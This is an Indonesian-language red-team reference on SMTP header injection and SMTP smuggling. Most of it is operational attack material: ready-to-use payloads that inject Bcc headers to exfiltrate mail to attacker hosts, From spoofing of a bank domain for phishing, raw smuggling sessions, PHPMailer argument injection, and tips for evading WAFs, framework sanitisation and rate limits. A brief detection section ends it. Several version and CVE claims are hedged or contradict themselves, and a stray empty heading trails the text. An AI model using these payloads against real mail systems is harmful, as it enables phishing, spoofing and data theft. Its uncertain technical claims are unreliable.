# mail-security--p2 — misc

# SMTP Header Injection — Referensi Red Team

## 1. Mekanisme: bagaimana newline masuk ke field email

SMTP (RFC 5321) memisahkan header dengan `CRLF` (`\r\n`). Header field berakhir di CRLF pertama; apa pun setelahnya diperlakukan sebagai header baru atau awal body. Vulnerability muncul ketika input user (dari HTTP form, JSON, dsb.) ditempel ke header email tanpa sanitasi newline.

**Karakter injeksi yang efektif:**

| Karakter | Encoding | Efektif? | Catatan |
|---|---|---|---|
| `\r\n` (CRLF) | `%0d%0a` | Ya | Standar SMTP |
| `\n` (LF) saja | `%0a` | Tergantung MTA | Postfix normalisasi; Exim historis menerima |
| `\r` (CR) saja | `%0d` | Jarang | Beberapa parser lama (Sendmail <8.13) |
| `\r\n ` (CRLF+SP) | — | Ya | **Folded header** — continuation line, bukan header baru |
| `\x00` | `%00` | Kadang | Truncation di C-string parser (PHP mail() pre-7.x) |
| Unicode line sep `U+2028` | — | Tidak | Tidak diinterpretasi SMTP |

**Titik masuk umum:**
- `To:`, `Cc:`, `Bcc:`, `From:`, `Reply-To:`, `Subject:` yang dibangun dari parameter user
- Nama display (`"Nama" <a@b.c>`) — injeksi lewat nama
- Header kustom (`X-*`) yang nilainya dari user

## 2. Dampak

### 2.1 Extra recipient (Bcc injection)

```
POST /contact HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

email=victim%40example.com%0d%0aBcc%3Aattacker%40evil.tld&subject=hi&body=x
```

**Apa yang dikirim aplikasi ke MTA:**
```
MAIL FROM:<noreply@app.example.com>
RCPT TO:<victim@example.com>
DATA
From: noreply@app.example.com
To: victim@example.com
Bcc: attacker@evil.tld
Subject: hi

x
.
```

**Yang muncul:** email sampai ke `attacker@evil.tld` juga, **tanpa** terlihat di header `To` si korban (karena `Bcc:` di-strip oleh MTA penerima). Efek: exfil data / spam relay.

**Kenapa berhasil:** library builder tidak memvalidasi newline, MTA menerima `Bcc:` tambahan dari client.

### 2.2 Header override — ganti From / Reply-To

```
email=victim%40example.com%0d%0aFrom%3Aceo%40bank.co.id%0d%0aReply-To%3Aattacker%40evil.tld
```

**Hasil:** dua header `From:` (asli + injeksi). Perilaku parser berbeda:
- **Postfix** (default): ambil yang **pertama** → injeksi gagal override, tapi `Reply-To` berhasil.
- **Exim 4.x**: ambil yang **terakhir** → override berhasil.
- **Sendmail 8.15+**: reject duplicate `From` bila `check_headers` aktif.

**Efek bisnis:** phishing dengan From domain sah, balasan diarahkan ke attacker.

### 2.3 Content-Type / body smuggling

```
subject=x%0d%0aContent-Type%3Atext%2Fhtml%3B%20charset%3Dutf-7%0d%0a%0d%0a<img src%3Dx onerror%3Dalert(1)>
```

**Hasil:** email dengan body HTML terinterpretasi; charset UTF-7 membuka vektor XSS di webmail lama (Roundcube <1.3.6, Zimbra <8.8.9).

### 2.4 SMTP smuggling (CVE-2023-51764, CVE-2023-51765)

Beda dari header injection: menyelundupkan **seluruh pesan kedua** lewat terminasi `DATA` yang tidak konsisten antar MTA.

```
From: x@a
To: y@b
Subject: legit

<body>\r\n.\r\nMAIL FROM:<a@evil>\r\nRCPT TO:<victim@target>\r\nDATA\r\nSubject: pwn\r\n\r\nx\r\n.\r\n
```

**Target rentan:** Postfix <3.8.4, Sendmail <8.17.2, Exim <4.97, Kerio, Sophos — ketika di depan relay dengan terminasi berbeda (mis. SMTP outbound → Exchange Online). Payload butuh `\r\n.\r\n` vs `\n.\n` mismatch antara inbound MTA dan relay.

## 3. Contoh HTTP request → email (end-to-end)

### 3.1 PHP `mail()` — CVE-2016-10033/10045 (PHPMailer <5.2.18)

**Aplikasi:**
```php
$mail = new PHPMailer();
$mail->setFrom($_POST['from']);
$mail->addAddress('support@corp.tld');
$mail->Subject = $_POST['subject'];
$mail->Body    = $_POST['body'];
$mail->send();
```

**Request:**
```
POST /submit HTTP/1.1
Host: app.corp.tld
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

from=attacker%40evil.tld%20-X%2Fvar%2Flib%2Fphp%2Fsess_x%20-OQueueDir%3D%2Ftmp&subject=hi&body=x
```

**Kenapa berhasil:** PHPMailer memakai `mail()` dengan `-f` param dari `setFrom`, tidak escape argumen shell → **argument injection** ke `sendmail` binary (bukan sekadar header injection). Versi rentan: PHPMailer <5.2.18, <5.2.19 (bypass `escapeshellarg` di Windows).

**Header injection klasik di `mail()` (PHP <8.0, before fix):**
```php
mail($to, $subject, $body, "From: $from");
// $from = "x@a\r\nBcc: attacker@evil.tld"
```
PHP 8.0+ memblokir newline di parameter `$additional_headers` (`ValueError`), tapi **tidak** memblokir injeksi lewat `$to` atau `$subject` sebelum 8.0. Inilah kenapa banyak CVE "email header injection" PHP berhenti setelah 7.4 EOL.

### 3.2 Python `smtplib` + manual header

**Rentan:**
```python
msg = f"From: {from_addr}\r\nTo: {to_addr}\r\nSubject: {subject}\r\n\r\n{body}"
smtp.sendmail(from_addr, [to_addr], msg)
```

**Payload:**
```json
{"from_addr":"a@b.c","to_addr":"v@corp.tld","subject":"hi\r\nBcc: attacker@evil.tld","body":"x"}
```

**Hasil:** `smtplib.sendmail` **tidak** memvalidasi CRLF sampai Python 3.12 — Python 3.12+ (`smtplib` 3.12) mulai reject newline di `sendmail()` argumen via `_quote_periods`-like check? **Faktanya: tidak** — `smtplib` masih menerima string multi-line dan mengirim apa adanya sebagai DATA. Mitigasi harus di layer aplikasi (`email.headerregistry`).

### 3.3 Node.js `nodemailer` <6.4.16 (CVE-2020-12768? — sebenarnya 6.4.16)

Nodemailer sejak 6.4.16 memvalidasi CRLF di address parser. Versi <6.4.16:
```js
transporter.sendMail({
  from: req.body.from,   // "x@a\r\nBcc: attacker@evil.tld"
  to: 'support@corp.tld',
  subject: 'hi',
  text: 'x'
});
```
→ extra recipient.

### 3.4 Java `javax.mail` (Jakarta Mail <1.6.5 / 2.0.0)

`InternetAddress` pre-1.6.5 menerima `"a@b.c\r\nBcc: x@y.z"` jika `strict=false` (default di banyak wrapper). Jakarta Mail 2.0.0+ (`org.eclipse.angus:jakarta.mail`) reject CR/LF di `InternetAddress.parse(strict=true)` — **default tetap `strict=false`** untuk kompatibilitas, jadi injeksi masih mungkin bila aplikasi tidak override.

### 3.5 Ruby `mail` gem <2.8.0

`Mail::Address.new("a@b\r\nBcc: x@y").to_s` → mengembalikan string dengan CRLF; `Mail::Message` baru memvalidasi di 2.8.0 (`Mail::Field` raises).

## 4. Matriks library & versi

| Library / produk | Versi rentan | Versi fixed | Vektor |
|---|---|---|---|
| PHPMailer | <5.2.18 (RCE arg), <5.2.19 (Win bypass) | 5.2.19 / 6.0.6 | Arg injection `-X`/`-O` |
| PHP `mail()` | PHP <8.0 (header), semua versi (to/subject) | partial 8.0 | CRLF di argumen |
| SwiftMailer | <5.4.5 | 5.4.5 | Header CRLF |
| Zend/Mail | <2.4.11 | — | Header CRLF |
| Python `smtplib` | semua (tidak validasi) | — | Butuh sanitasi aplikasi |
| Nodemailer | <6.4.16 | 6.4.16 | Address CRLF |
| Jakarta Mail | <1.6.5 | 1.6.5+ (strict default false!) | InternetAddress |
| Ruby `mail` | <2.8.0 | 2.8.0 | Field parse |
| Postfix | <3.8.4 | 3.8.4 | SMTP smuggling |
| Exim | <4.97 | 4.97 | SMTP smuggling |
| Sendmail | <8.17.2 | 8.17.2 | SMTP smuggling |
| Exchange Server | <CU 2024 H1 | 2024 H1 | Smuggling (relay) |

## 5. Verifikasi cepat di lab

**Cek apakah MTA menerima Bcc tambahan dari DATA:**
```bash
printf 'EHLO t\r\nMAIL FROM:<a@t>\r\nRCPT TO:<v@t>\r\nDATA\r\nFrom: a@t\r\nTo: v@t\r\nBcc: x@evil\r\nSubject: t\r\n\r\nbody\r\n.\r\nQUIT\r\n' \
  | nc -w 5 mail.target.tld 25
```

**Cek parser Postfix vs Exim terhadap duplicate `From:`:**
```bash
swaks --to v@t --from a@t --header 'From: spoof@evil' \
      --server mail.target.tld --port 25
# Lihat header From yang diterima di mailbox v@t
```

**Deteksi smtp smuggling (payload LF-only terminasi):**
```bash
swaks --to v@t --from a@t --server mail.target.tld \
      --data $'Subject: t\n\nbody\n.\nMAIL FROM:<s@evil>\nRCPT TO:<v2@t>\nDATA\nSubject: pwn\n\nx\n.\n'
```

**Grep aplikasi rentan:**
```bash
# Cari pola concatenation header
grep -rnE '(Subject|From|To|Cc|Bcc):\s*["\x27].*\$_(GET|POST|REQUEST)' --include='*.php' .
grep -rnE 'headers\s*=\s*[`"].*\$\{' --include='*.js' --include='*.ts' .
grep -rnE 'msg\s*=\s*f["\x27].*(From|To|Subject).*\{' --include='*.py' .
```

## 6. Jebakan operasional (yang bikin gagal di lapangan)

| Jebakan | Kenapa gagal | Workaround |
|---|---|---|
| **Modern framework auto-sanitize** — Laravel `Mail` (Swift/Symfony Mailer), Rails `ActionMailer` (Mail gem ≥2.8), Django `EmailMessage` ≥4.0 | `ValueError`/`InvalidHeaderDefect` sebelum sampai MTA | Cari jalur bypass: injeksi lewat *nama display* di `Address` (Rails <7.0), atau lewat `sender` bukan `from` |
| **Filter WAF** memblokir `%0d%0a` di body/query | Request 403 sebelum app | Double-encode `%250d%250a` bila app double-decode; atau pakai `\n` tunggal (Postfix normalize jadi CRLF) |
| **PHP 8.0+ `mail()`** menolak CRLF di `$additional_headers` | `ValueError` | Vektor pindah ke `$to`/`$subject` **jika** app masih pakai `mail()` langsung; atau ke argumen ke-5 `-f` (CVE PHPMailer-style) |
| **Postfix `header_checks` / `smtpd_recipient_restrictions`** menolak Bcc tambahan dari client | 550 | Target MTA yang tidak inspect header dari submission port (587 tanpa submission config ketat) |
| **Outbound relay** (SendGrid, SES, Mailgun) rewrite header | Injeksi hilang | Cari injeksi di **sisi inbound**: form "auto-reply", "share", "invite" yang kirim ke internal MTA saja |
| **DKIM/SPF enforcement** di penerima | Email injeksi masuk spam/reject walau Bcc sampai | Untuk exfil cukup Bcc sampai; untuk phishing butuh subdomain yang punya SPF/DKIM sah |
| **Webmail HTML strip** — Gmail menghapus `<img onerror>` | XSS gagal | Cari webmail lama (Roundcube <1.3.6) atau klien desktop (Thunderbird <78.4?) yang parse HTML mentah |
| **`Content-Type: multipart`** — injeksi di tengah body multipart | MTA treat sebagai boundary salah → body corrupt | Injeksi di header, bukan body; atau override `Content-Type` sebelum boundary |
| **Homoglyph/unicode space** di folded header | Parser modern reject | Pakai tab (0x09) sebagai continuation, bukan space |
| **Exchange Online** normalize CRLF di transport rule | Smuggling gagal | Butuh hop pertama yang tidak normalize (Postfix <3.8.4 di depan EOP) |
| **App pakai SDK transaksional** (SendGrid v3 API, SES `SendEmail` JSON) | API JSON tidak parsing CRLF sebagai header | Vektor mati; cari komponen yang build MIME manual (mis. SES `SendRawEmail` + template) |
| **Rate limit / anti-spam** di MTA tujuan | Bcc sampai tapi ter-throttle | Batch kecil (1–5 per menit), rotate source IP |

## 7. Artefak payload siap pakai

**Form HTTP → Bcc (URL-encoded):**
```
email=victim%40target.tld%0d%0aBcc%3Aexfil%40attacker.tld
```

**From override (Exim target):**
```
email=victim%40target.tld%0d%0aFrom%3Aceo%40bank.co.id%0d%0aReply-To%3Aexfil%40attacker.tld
```

**Header folding bypass filter naif (`\r\n\t`):**
```
subject=hi%0d%0a%09Bcc%3Aexfil%40attacker.tld
```

**SMTP smuggling (Postfix→EOP, CVE-2023-51764):**
```
EHLO x\r\n
MAIL FROM:<a@attacker.tld>\r\n
RCPT TO:<victim@target.tld>\r\n
DATA\r\n
From: a@attacker.tld\r\n
To: victim@target.tld\r\n
Subject: legit\r\n
\r\n
body\r\n
.\r\n
MAIL FROM:<spoof@bank.co.id>\r\n
RCPT TO:<victim2@target.tld>\r\n
DATA\r\n
Subject: phish\r\n
\r\n
click\r\n
.\r\n
QUIT\r\n
```

**cURL untuk reproduksi lab:**
```bash
curl -sS -X POST https://app.example.com/contact \
  --data-urlencode 'email=victim@target.tld
Bcc: exfil@attacker.tld' \
  --data-urlencode 'subject=hi' \
  --data-urlencode 'body=x' -o /dev/null -w '%{http_code}\n'
```

## 8. Deteksi & regresi (untuk blue team handoff)

- **MTA log audit (Postfix):** `grep -E 'Bcc:.*<.*@' /var/log/mail.log` — Bcc dari client submission port (587) bukan via SMTP AUTH app account = anomali.
- **Aplikasi:** unit test dengan payload `\r\nBcc:` di setiap field; assert tidak ada header baru di output MIME.
- **SIEM rule:** log HTTP POST dengan `%0d%0a` di body ke endpoint yang trigger email (regex di WAF log).
- **eBPF / strace:** trace `execve("/usr/sbin/sendmail", ["-f", "...", "-X", ...])` — argumen `-X`/`-O`/`-C` dari input user = indikasi CVE PHPMailer-class.

---

## [reasoning trace]


